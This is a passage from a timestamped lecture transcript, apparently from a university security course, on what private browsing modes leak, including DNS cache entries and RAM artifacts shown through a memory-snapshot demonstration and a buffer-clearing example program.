            </slice>
            <slice>
              <time_slice>7:43</time_slice>
              <text_slice>like client certificates.</text_slice>
            </slice>
            <slice>
              <time_slice>7:47</time_slice>
              <text_slice>You could also think about
stuff like bookmarks.</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>Maybe if you logged into a
particular site and the browser</text_slice>
            </slice>
            <slice>
              <time_slice>7:58</time_slice>
              <text_slice>offers to store your
passwords in another type</text_slice>
            </slice>
            <slice>
              <time_slice>8:00</time_slice>
              <text_slice>of configuration state that
you might not want leaking</text_slice>
            </slice>
            <slice>
              <time_slice>8:02</time_slice>
              <text_slice>from private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>Downloaded files--
as we'll discuss,</text_slice>
            </slice>
            <slice>
              <time_slice>8:09</time_slice>
              <text_slice>this one's a little
bit interesting</text_slice>
            </slice>
            <slice>
              <time_slice>8:12</time_slice>
              <text_slice>because downloading a file
actually requires explicit user</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>action to download that file.</text_slice>
            </slice>
            <slice>
              <time_slice>8:17</time_slice>
              <text_slice>Maybe we do actually
want this stuff</text_slice>
            </slice>
            <slice>
              <time_slice>8:18</time_slice>
              <text_slice>to leak outside of
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>8:20</time_slice>
              <text_slice>Maybe if you download something
in private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>8:22</time_slice>
              <text_slice>it should actually be accessible
when you open the browser</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>or use the machine
after that session.</text_slice>
            </slice>
            <slice>
              <time_slice>8:26</time_slice>
              <text_slice>So we'll talk about this
a little bit in a second.</text_slice>
            </slice>
            <slice>
              <time_slice>8:30</time_slice>
              <text_slice>And then, finally, during
private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>8:34</time_slice>
              <text_slice>you might install new
plug-ins or browser sessions.</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>That's another type
of state that you</text_slice>
            </slice>
            <slice>
              <time_slice>8:45</time_slice>
              <text_slice>might imagine you don't
want to leak outside</text_slice>
            </slice>
            <slice>
              <time_slice>8:48</time_slice>
              <text_slice>of private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>8:50</time_slice>
              <text_slice>So, basically, current
browsing modes typically</text_slice>
            </slice>
            <slice>
              <time_slice>8:54</time_slice>
              <text_slice>try to prevent one, two, and
three from leaking outside</text_slice>
            </slice>
            <slice>
              <time_slice>8:58</time_slice>
              <text_slice>of private browser sessions.</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>So there shouldn't be
any cookies or DOM stores</text_slice>
            </slice>
            <slice>
              <time_slice>9:02</time_slice>
              <text_slice>to get out of there.</text_slice>
            </slice>
            <slice>
              <time_slice>9:03</time_slice>
              <text_slice>Anything you put in a cache
during a private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>9:05</time_slice>
              <text_slice>session should be deleted.</text_slice>
            </slice>
            <slice>
              <time_slice>9:07</time_slice>
              <text_slice>And you shouldn't have
any history of the URLs</text_slice>
            </slice>
            <slice>
              <time_slice>9:09</time_slice>
              <text_slice>that you're using.</text_slice>
            </slice>
            <slice>
              <time_slice>9:11</time_slice>
              <text_slice>Typically, four, five, and
six private browsing modes</text_slice>
            </slice>
            <slice>
              <time_slice>9:14</time_slice>
              <text_slice>allow to leak
outside of a session.</text_slice>
            </slice>
            <slice>
              <time_slice>9:16</time_slice>
              <text_slice>And there's some good
and some bad reasons</text_slice>
            </slice>
            <slice>
              <time_slice>9:19</time_slice>
              <text_slice>why this might be the case.</text_slice>
            </slice>
            <slice>
              <time_slice>9:20</time_slice>
              <text_slice>And as we'll
discuss later, we'll</text_slice>
            </slice>
            <slice>
              <time_slice>9:22</time_slice>
              <text_slice>see if you allow anything to
leak from the private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>9:25</time_slice>
              <text_slice>session, that actually
radically increases the threat</text_slice>
            </slice>
            <slice>
              <time_slice>9:28</time_slice>
              <text_slice>surface of private leaks.</text_slice>
            </slice>
            <slice>
              <time_slice>9:29</time_slice>
              <text_slice>So it becomes much more
difficult to reason</text_slice>
            </slice>
            <slice>
              <time_slice>9:31</time_slice>
              <text_slice>about what the
security properties are</text_slice>
            </slice>
            <slice>
              <time_slice>9:33</time_slice>
              <text_slice>for private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>9:34</time_slice>
              <text_slice>Does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>9:35</time_slice>
              <text_slice>Anyone have any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>9:38</time_slice>
              <text_slice>It's pretty straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>9:41</time_slice>
              <text_slice>So the next thing we're going
to talk about very briefly</text_slice>
            </slice>
            <slice>
              <time_slice>9:45</time_slice>
              <text_slice>is network activity during
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>9:50</time_slice>
              <text_slice>And what's
interesting about this</text_slice>
            </slice>
            <slice>
              <time_slice>9:53</time_slice>
              <text_slice>is that even if we
cover all this stuff--</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>we don't allow private
browsing to leak anything</text_slice>
            </slice>
            <slice>
              <time_slice>9:58</time_slice>
              <text_slice>from there-- the mere fact that
you're issuing network packet</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>connections leave evidence
of what you were doing.</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>So imagine when you
want to go to foo.com,</text_slice>
            </slice>
            <slice>
              <time_slice>10:06</time_slice>
              <text_slice>the website, your
machine actually</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>has to issue a DNS resolution
request for foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>10:12</time_slice>
              <text_slice>So even if you don't
leave any of this type</text_slice>
            </slice>
            <slice>
              <time_slice>10:14</time_slice>
              <text_slice>of persistent state
up there, there</text_slice>
            </slice>
            <slice>
              <time_slice>10:15</time_slice>
              <text_slice>may be records in
your local DNS cache</text_slice>
            </slice>
            <slice>
              <time_slice>10:18</time_slice>
              <text_slice>that you, in fact, tried to
resolve the hostname foo.com.</text_slice>
            </slice>
            <slice>
              <time_slice>10:21</time_slice>
              <text_slice>That's very interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>10:22</time_slice>
              <text_slice>So you can imagine
that browsers could</text_slice>
            </slice>
            <slice>
              <time_slice>10:24</time_slice>
              <text_slice>try to flush the
DNS cache somehow</text_slice>
            </slice>
            <slice>
              <time_slice>10:27</time_slice>
              <text_slice>after the private
session was over.</text_slice>
            </slice>
            <slice>
              <time_slice>10:29</time_slice>
              <text_slice>Now, in practice,
that's actually</text_slice>
            </slice>
            <slice>
              <time_slice>10:30</time_slice>
              <text_slice>tricky to do because
on many systems,</text_slice>
            </slice>
            <slice>
              <time_slice>10:31</time_slice>
              <text_slice>you require administrator
privileges to do that.</text_slice>
            </slice>
            <slice>
              <time_slice>10:34</time_slice>
              <text_slice>So it's not clear if you want
the browser running as root</text_slice>
            </slice>
            <slice>
              <time_slice>10:37</time_slice>
              <text_slice>because browsers, as
we've seen, are somewhat</text_slice>
            </slice>
            <slice>
              <time_slice>10:40</time_slice>
              <text_slice>untrustworthy individuals.</text_slice>
            </slice>
            <slice>
              <time_slice>10:42</time_slice>
              <text_slice>And also too-- a
lot of DNS flush</text_slice>
            </slice>
            <slice>
              <time_slice>10:44</time_slice>
              <text_slice>commands-- they don't
actually act per user.</text_slice>
            </slice>
            <slice>
              <time_slice>10:46</time_slice>
              <text_slice>They flush the
entire cache, which</text_slice>
            </slice>
            <slice>
              <time_slice>10:47</time_slice>
              <text_slice>is typically not what you would
want if you're implementing</text_slice>
            </slice>
            <slice>
              <time_slice>10:50</time_slice>
              <text_slice>private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>10:51</time_slice>
              <text_slice>You'd want to use a
type of surgical thing</text_slice>
            </slice>
            <slice>
              <time_slice>10:53</time_slice>
              <text_slice>where I only want to get rid
of foo.com and things that</text_slice>
            </slice>
            <slice>
              <time_slice>10:55</time_slice>
              <text_slice>were visited during this
private browsing sessions,</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>but not delete other things.</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>So in practice, that's kind
of a tricky thing to handle.</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>And another tricky
thing to handle,</text_slice>
            </slice>
            <slice>
              <time_slice>11:03</time_slice>
              <text_slice>which the paper mentions--
are these things</text_slice>
            </slice>
            <slice>
              <time_slice>11:08</time_slice>
              <text_slice>that I'll call RAM artifacts.</text_slice>
            </slice>
            <slice>
              <time_slice>11:13</time_slice>
              <text_slice>So the basic idea here is that
during private browsing mode,</text_slice>
            </slice>
            <slice>
              <time_slice>11:18</time_slice>
              <text_slice>that private browser has to be
keeping some stuff in memory.</text_slice>
            </slice>
            <slice>
              <time_slice>11:22</time_slice>
              <text_slice>And so even if the
private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>11:24</time_slice>
              <text_slice>doesn't issue any direct
I/Os to disk-- user rights.</text_slice>
            </slice>
            <slice>
              <time_slice>11:29</time_slice>
              <text_slice>The RAM that belongs to
that private browsing tab</text_slice>
            </slice>
            <slice>
              <time_slice>11:32</time_slice>
              <text_slice>can still be reflected into
the page file, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>11:35</time_slice>
              <text_slice>It can still be reflected
into the hibernation file,</text_slice>
            </slice>
            <slice>
              <time_slice>11:38</time_slice>
              <text_slice>for example, the laptop.</text_slice>
            </slice>
            <slice>
              <time_slice>11:40</time_slice>
              <text_slice>And so if that
state gets reflected</text_slice>
            </slice>
            <slice>
              <time_slice>11:42</time_slice>
              <text_slice>into persistent storage, then
what may end up happening</text_slice>
            </slice>
            <slice>
              <time_slice>11:45</time_slice>
              <text_slice>is that after your private
browsing session is over,</text_slice>
            </slice>
            <slice>
              <time_slice>11:47</time_slice>
              <text_slice>the attacker can look in
your page file, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>11:50</time_slice>
              <text_slice>and find, for example,
JavaScript code that</text_slice>
            </slice>
            <slice>
              <time_slice>11:52</time_slice>
              <text_slice>was reflected to
disk or find HTML</text_slice>
            </slice>
            <slice>
              <time_slice>11:54</time_slice>
              <text_slice>that was reflected to disk.</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>So we're going to have a
little demonstration of how</text_slice>
            </slice>
            <slice>
              <time_slice>11:59</time_slice>
              <text_slice>this might work.</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>So if you see up
here on the screen,</text_slice>
            </slice>
            <slice>
              <time_slice>12:04</time_slice>
              <text_slice>I basically loaded up
private browsing tabs.</text_slice>
            </slice>
            <slice>
              <time_slice>12:09</time_slice>
              <text_slice>And so what I'm
going to do is I'm</text_slice>
            </slice>
            <slice>
              <time_slice>12:11</time_slice>
              <text_slice>going to go to some website.</text_slice>
            </slice>
            <slice>
              <time_slice>12:15</time_slice>
              <text_slice>So this is for the PDOS
group here at CSAIL.</text_slice>
            </slice>
            <slice>
              <time_slice>12:21</time_slice>
              <text_slice>I've loaded up that page.</text_slice>
            </slice>
            <slice>
              <time_slice>12:23</time_slice>
              <text_slice>And then what I'm
going to do is use</text_slice>
            </slice>
            <slice>
              <time_slice>12:25</time_slice>
              <text_slice>this fun command called gcore.</text_slice>
            </slice>
            <slice>
              <time_slice>12:28</time_slice>
              <text_slice>So, basically, I'm
going to take a memory</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>snapshot of this running page.</text_slice>
            </slice>
            <slice>
              <time_slice>12:34</time_slice>
              <text_slice>And so I will do
the following magic.</text_slice>
            </slice>
            <slice>
              <time_slice>12:48</time_slice>
              <text_slice>So basically there's
going to be some work</text_slice>
            </slice>
            <slice>
              <time_slice>12:53</time_slice>
              <text_slice>that my terminal is doing to
generate that memory snapshot.</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>So this takes a little
bit of time sometimes.</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>Now, what's happening here.</text_slice>
            </slice>
            <slice>
              <time_slice>13:16</time_slice>
              <text_slice>So now we've basically
generated the core file</text_slice>
            </slice>
            <slice>
              <time_slice>13:18</time_slice>
              <text_slice>for that private browsing image.</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>So what we're going
to do now is we're</text_slice>
            </slice>
            <slice>
              <time_slice>13:22</time_slice>
              <text_slice>going to look
inside of that image</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>and see if we can find
any mentions of PDOS.</text_slice>
            </slice>
            <slice>
              <time_slice>13:33</time_slice>
              <text_slice>And so what's
interesting is we see</text_slice>
            </slice>
            <slice>
              <time_slice>13:35</time_slice>
              <text_slice>a ton of instances of the
string PDOS in that memory image</text_slice>
            </slice>
            <slice>
              <time_slice>13:39</time_slice>
              <text_slice>for the private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>13:41</time_slice>
              <text_slice>And so what is interesting
is we actually see</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>various prefixes for things.</text_slice>
            </slice>
            <slice>
              <time_slice>13:45</time_slice>
              <text_slice>If we look further
up, we can see things</text_slice>
            </slice>
            <slice>
              <time_slice>13:48</time_slice>
              <text_slice>like there's full URLs
here and things like this.</text_slice>
            </slice>
            <slice>
              <time_slice>13:52</time_slice>
              <text_slice>You also find HTML
code in there.</text_slice>
            </slice>
            <slice>
              <time_slice>13:55</time_slice>
              <text_slice>So the point here is
that if we found all this</text_slice>
            </slice>
            <slice>
              <time_slice>13:58</time_slice>
              <text_slice>in the memory of that page, then
if this-- if any of those pages</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>got put to disk in the
page file, then he attacker</text_slice>
            </slice>
            <slice>
              <time_slice>14:05</time_slice>
              <text_slice>could basically
just run strings.</text_slice>
            </slice>
            <slice>
              <time_slice>14:07</time_slice>
              <text_slice>So they could do what I
just did over the page file</text_slice>
            </slice>
            <slice>
              <time_slice>14:09</time_slice>
              <text_slice>and try to find out what
sites that you visited</text_slice>
            </slice>
            <slice>
              <time_slice>14:11</time_slice>
              <text_slice>in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>14:13</time_slice>
              <text_slice>So does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>14:14</time_slice>
              <text_slice>Basically, the problem here
is that private browsing modes</text_slice>
            </slice>
            <slice>
              <time_slice>14:17</time_slice>
              <text_slice>don't try to obfuscate RAM
basically or encrypt it</text_slice>
            </slice>
            <slice>
              <time_slice>14:20</time_slice>
              <text_slice>in any way.</text_slice>
            </slice>
            <slice>
              <time_slice>14:21</time_slice>
              <text_slice>And that seems like a pretty
fundamental thing because</text_slice>
            </slice>
            <slice>
              <time_slice>14:23</time_slice>
              <text_slice>at a certain point,
the processor</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>has to execute on
clear text data.</text_slice>
            </slice>
            <slice>
              <time_slice>14:27</time_slice>
              <text_slice>And so this is actually
a pretty big challenge.</text_slice>
            </slice>
            <slice>
              <time_slice>14:31</time_slice>
              <text_slice>So does anyone
have any questions?</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>14:34</time_slice>
              <text_slice>AUDIENCE: So one thing is
I don't expect my browser</text_slice>
            </slice>
            <slice>
              <time_slice>14:37</time_slice>
              <text_slice>to do that.</text_slice>
            </slice>
            <slice>
              <time_slice>14:38</time_slice>
              <text_slice>One thing is that these
browsers-- the guarantee</text_slice>
            </slice>
            <slice>
              <time_slice>14:41</time_slice>
              <text_slice>that they give you
through private browsing--</text_slice>
            </slice>
            <slice>
              <time_slice>14:42</time_slice>
              <text_slice>the example they give is if
you're shopping for something,</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>your layman friend
can't go on the computer</text_slice>
            </slice>
            <slice>
              <time_slice>14:47</time_slice>
              <text_slice>and see the things.</text_slice>
            </slice>
            <slice>
              <time_slice>14:49</time_slice>
              <text_slice>So can you talk a little bit
about what guarantees they give</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>and if they had
to change anything</text_slice>
            </slice>
            <slice>
              <time_slice>14:52</time_slice>
              <text_slice>as a consequence of this paper?</text_slice>
            </slice>
            <slice>
              <time_slice>14:54</time_slice>
              <text_slice>PROFESSOR: Yeah, it's
very interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>14:57</time_slice>
              <text_slice>One thing you can look
at is when you open up</text_slice>
            </slice>
            <slice>
              <time_slice>14:58</time_slice>
              <text_slice>a private browsing
tab, typically</text_slice>
            </slice>
            <slice>
              <time_slice>15:00</time_slice>
              <text_slice>there will be a little
blurb that says, hey,</text_slice>
            </slice>
            <slice>
              <time_slice>15:02</time_slice>
              <text_slice>welcome to incognito mode.</text_slice>
            </slice>
            <slice>
              <time_slice>15:03</time_slice>
              <text_slice>Here's where we'll
help you against.</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>We won't help you if someone
is standing behind you</text_slice>
            </slice>
            <slice>
              <time_slice>15:07</time_slice>
              <text_slice>with a rubber hose
about to beat you.</text_slice>
            </slice>
            <slice>
              <time_slice>15:08</time_slice>
              <text_slice>And so the browser
vendors themselves</text_slice>
            </slice>
            <slice>
              <time_slice>15:10</time_slice>
              <text_slice>area little bit cagey about
what guarantees they provide.</text_slice>
            </slice>
            <slice>
              <time_slice>15:14</time_slice>
              <text_slice>And in fact, after the Snowden
incident, a lot of the browsers</text_slice>
            </slice>
            <slice>
              <time_slice>15:17</time_slice>
              <text_slice>actually changed
that splash page</text_slice>
            </slice>
            <slice>
              <time_slice>15:18</time_slice>
              <text_slice>because they wanted to
actually make it clear</text_slice>
            </slice>
            <slice>
              <time_slice>15:20</time_slice>
              <text_slice>that we're not actually
protecting from strong ways</text_slice>
            </slice>
            <slice>
              <time_slice>15:22</time_slice>
              <text_slice>with the NSA or
something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>15:24</time_slice>
              <text_slice>So long story short,
what guarantees</text_slice>
            </slice>
            <slice>
              <time_slice>15:26</time_slice>
              <text_slice>are they providing you?</text_slice>
            </slice>
            <slice>
              <time_slice>15:27</time_slice>
              <text_slice>In practice, they're
providing that weak thing</text_slice>
            </slice>
            <slice>
              <time_slice>15:30</time_slice>
              <text_slice>that you mention there.</text_slice>
            </slice>
            <slice>
              <time_slice>15:31</time_slice>
              <text_slice>It's like a lay
person who wanted</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>to see what you were
doing afterwards</text_slice>
            </slice>
            <slice>
              <time_slice>15:34</time_slice>
              <text_slice>couldn't figure out
what you were doing.</text_slice>
            </slice>
            <slice>
              <time_slice>15:36</time_slice>
              <text_slice>And we're assuming
the lay person</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>can't run strings on the page
file or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>15:41</time_slice>
              <text_slice>Now, the problem-- there's
actually two problems though.</text_slice>
            </slice>
            <slice>
              <time_slice>15:43</time_slice>
              <text_slice>One problem is that first
of all, because browsers</text_slice>
            </slice>
            <slice>
              <time_slice>15:47</time_slice>
              <text_slice>are so complicated,
they often don't even</text_slice>
            </slice>
            <slice>
              <time_slice>15:49</time_slice>
              <text_slice>protect against the layperson.</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>I can give you a
personal example.</text_slice>
            </slice>
            <slice>
              <time_slice>15:52</time_slice>
              <text_slice>So a lot of times when you
see those ridiculous ads</text_slice>
            </slice>
            <slice>
              <time_slice>15:56</time_slice>
              <text_slice>from "Huffington Post,"
like, oh, my gosh.</text_slice>
            </slice>
            <slice>
              <time_slice>15:58</time_slice>
              <text_slice>It's like puppies trying to
help small puppies go down</text_slice>
            </slice>
            <slice>
              <time_slice>16:00</time_slice>
              <text_slice>stairs and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>16:02</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>16:03</time_slice>
              <text_slice>Because I'm weak, I will
sometimes hook on those things.</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>But because I don't know
want people to know that,</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>I'll sometimes do that
in private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>So what will happen sometimes
is that sometimes I'll</text_slice>
            </slice>
            <slice>
              <time_slice>16:12</time_slice>
              <text_slice>see those URLs will
leak into my URL history</text_slice>
            </slice>
            <slice>
              <time_slice>16:16</time_slice>
              <text_slice>like my regular, public
mode browser, which</text_slice>
            </slice>
            <slice>
              <time_slice>16:19</time_slice>
              <text_slice>is precisely what this
stuff is designed not to do.</text_slice>
            </slice>
            <slice>
              <time_slice>16:22</time_slice>
              <text_slice>So one problem is that
sometimes these browsers</text_slice>
            </slice>
            <slice>
              <time_slice>16:25</time_slice>
              <text_slice>don't provide protection
against the layperson attackers.</text_slice>
            </slice>
            <slice>
              <time_slice>16:27</time_slice>
              <text_slice>The second thing is I think
that there are actually</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>a lot of people who would
like for private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>16:32</time_slice>
              <text_slice>to provide something
stronger, particularly</text_slice>
            </slice>
            <slice>
              <time_slice>16:34</time_slice>
              <text_slice>with the whole Snowden thing.</text_slice>
            </slice>
            <slice>
              <time_slice>16:36</time_slice>
              <text_slice>I think there is a lot
of people increasingly</text_slice>
            </slice>
            <slice>
              <time_slice>16:37</time_slice>
              <text_slice>who would like private
browsing mode to protect,</text_slice>
            </slice>
            <slice>
              <time_slice>16:39</time_slice>
              <text_slice>for example, against these
RAM artifact attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>16:41</time_slice>
              <text_slice>even though they may not be
able to technically articulate</text_slice>
            </slice>
            <slice>
              <time_slice>16:44</time_slice>
              <text_slice>that goal.</text_slice>
            </slice>
            <slice>
              <time_slice>16:45</time_slice>
              <text_slice>And so actually one
of the things I've</text_slice>
            </slice>
            <slice>
              <time_slice>16:47</time_slice>
              <text_slice>done while I was
here, I got to do</text_slice>
            </slice>
            <slice>
              <time_slice>16:48</time_slice>
              <text_slice>some research in a stronger
private browsing mode</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>protection.</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>So we can chat about
that after all.</text_slice>
            </slice>
            <slice>
              <time_slice>16:52</time_slice>
              <text_slice>One of the things we
learn about all professors</text_slice>
            </slice>
            <slice>
              <time_slice>16:54</time_slice>
              <text_slice>is that we will talk about
our research endlessly.</text_slice>
            </slice>
            <slice>
              <time_slice>16:56</time_slice>
              <text_slice>So if you want to talk about
that for three hours just</text_slice>
            </slice>
            <slice>
              <time_slice>16:59</time_slice>
              <text_slice>send me a calendar request.</text_slice>
            </slice>
            <slice>
              <time_slice>17:00</time_slice>
              <text_slice>And we can do that.</text_slice>
            </slice>
            <slice>
              <time_slice>17:02</time_slice>
              <text_slice>So, anyway, this is
basically a demonstration.</text_slice>
            </slice>
            <slice>
              <time_slice>17:06</time_slice>
              <text_slice>Oh, you had a question?</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>AUDIENCE: Yeah, about the RAM.</text_slice>
            </slice>
            <slice>
              <time_slice>17:09</time_slice>
              <text_slice>So I'm not familiar with
how it works exactly.</text_slice>
            </slice>
            <slice>
              <time_slice>17:12</time_slice>
              <text_slice>How come a browser can't
at the end of a session,</text_slice>
            </slice>
            <slice>
              <time_slice>17:15</time_slice>
              <text_slice>just ask the OS to flush those
parts around that he was using?</text_slice>
            </slice>
            <slice>
              <time_slice>17:19</time_slice>
              <text_slice>PROFESSOR: So we're
actually going</text_slice>
            </slice>
            <slice>
              <time_slice>17:20</time_slice>
              <text_slice>to get to that topic
in a couple of minutes.</text_slice>
            </slice>
            <slice>
              <time_slice>17:23</time_slice>
              <text_slice>But you are correct.</text_slice>
            </slice>
            <slice>
              <time_slice>17:24</time_slice>
              <text_slice>At a high level,
what you can imagine</text_slice>
            </slice>
            <slice>
              <time_slice>17:26</time_slice>
              <text_slice>is that maybe the OS when it,
for example, killed a process,</text_slice>
            </slice>
            <slice>
              <time_slice>17:30</time_slice>
              <text_slice>would actually go through
all those numbered pages</text_slice>
            </slice>
            <slice>
              <time_slice>17:32</time_slice>
              <text_slice>and write zeros to
all those pages.</text_slice>
            </slice>
            <slice>
              <time_slice>17:34</time_slice>
              <text_slice>Or you could also imagine
that maybe the browser tried</text_slice>
            </slice>
            <slice>
              <time_slice>17:37</time_slice>
              <text_slice>to pin all the pages in
memory to prevent anything</text_slice>
            </slice>
            <slice>
              <time_slice>17:40</time_slice>
              <text_slice>from getting flushed out at all.</text_slice>
            </slice>
            <slice>
              <time_slice>17:42</time_slice>
              <text_slice>So there are some
solutions that can do that.</text_slice>
            </slice>
            <slice>
              <time_slice>17:44</time_slice>
              <text_slice>So hold onto that
question for one second.</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>This is basically an
example of how data from RAM</text_slice>
            </slice>
            <slice>
              <time_slice>17:50</time_slice>
              <text_slice>can leak onto disk
through paging activity.</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>But note that data lifetime
is a bigger problem than just</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>in the context of
private browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>18:00</time_slice>
              <text_slice>You can imagine that any
programs that deals with,</text_slice>
            </slice>
            <slice>
              <time_slice>18:02</time_slice>
              <text_slice>let's say, cryptographic
keys or user passwords</text_slice>
            </slice>
            <slice>
              <time_slice>18:05</time_slice>
              <text_slice>will have this problem.</text_slice>
            </slice>
            <slice>
              <time_slice>18:06</time_slice>
              <text_slice>Anytime you type in your
password to a a program,</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>the memory page which holds
that password can always get</text_slice>
            </slice>
            <slice>
              <time_slice>18:12</time_slice>
              <text_slice>reflected to disk.</text_slice>
            </slice>
            <slice>
              <time_slice>18:13</time_slice>
              <text_slice>So let me show you
another example of this.</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>So let's say that we looked at
the following program, which</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>is pretty simple.</text_slice>
            </slice>
            <slice>
              <time_slice>18:25</time_slice>
              <text_slice>It's called memclear.</text_slice>
            </slice>
            <slice>
              <time_slice>18:26</time_slice>
              <text_slice>So you see here at
the bottom and main,</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>we're just going to read in
some secret text file here.</text_slice>
            </slice>
            <slice>
              <time_slice>18:33</time_slice>
              <text_slice>And then we're just
going to sleep forever.</text_slice>
            </slice>
            <slice>
              <time_slice>18:35</time_slice>
              <text_slice>So what is that Read Secret do?</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>Basically, it reasons from file.</text_slice>
            </slice>
            <slice>
              <time_slice>18:42</time_slice>
              <text_slice>It's going to print out
the contents of that file.</text_slice>
            </slice>
            <slice>
              <time_slice>18:48</time_slice>
              <text_slice>And then it's actually
going to clear out</text_slice>
            </slice>
            <slice>
              <time_slice>18:50</time_slice>
              <text_slice>the buffer that was used to
store that secret information.</text_slice>
            </slice>
            <slice>
              <time_slice>18:54</time_slice>
              <text_slice>So getting back to your issue.</text_slice>
            </slice>
            <slice>
              <time_slice>18:55</time_slice>
              <text_slice>So one can imagine the
browser, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>18:57</time_slice>
              <text_slice>would try to just memset to
zero all the secrets that it</text_slice>
            </slice>
            <slice>
              <time_slice>19:01</time_slice>
              <text_slice>encountered when it's
just in private browser.</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
              <text_slice>So if we look at the secret
files, it's not very fun.</text_slice>
            </slice>
            <slice>
              <time_slice>19:12</time_slice>
              <text_slice>It just says, my
secrets of in a file.</text_slice>
            </slice>
            <slice>
              <time_slice>19:14</time_slice>
              <text_slice>And then if we run this
program, in the background--</text_slice>
            </slice>
            <slice>
              <time_slice>19:21</time_slice>
              <text_slice>so what did it do?</text_slice>
            </slice>
            <slice>
              <time_slice>19:22</time_slice>
              <text_slice>So like I said, it
just printed it out.</text_slice>
            </slice>
            <slice>
              <time_slice>19:24</time_slice>
              <text_slice>It read that file in, printed
out the secret value--</text_slice>
            </slice>
            <slice>
              <time_slice>19:26</time_slice>
              <text_slice>cleared the memory
buffer that it</text_slice>
            </slice>
            <slice>
              <time_slice>19:28</time_slice>
              <text_slice>used to print that stuff out.</text_slice>
            </slice>
            <slice>
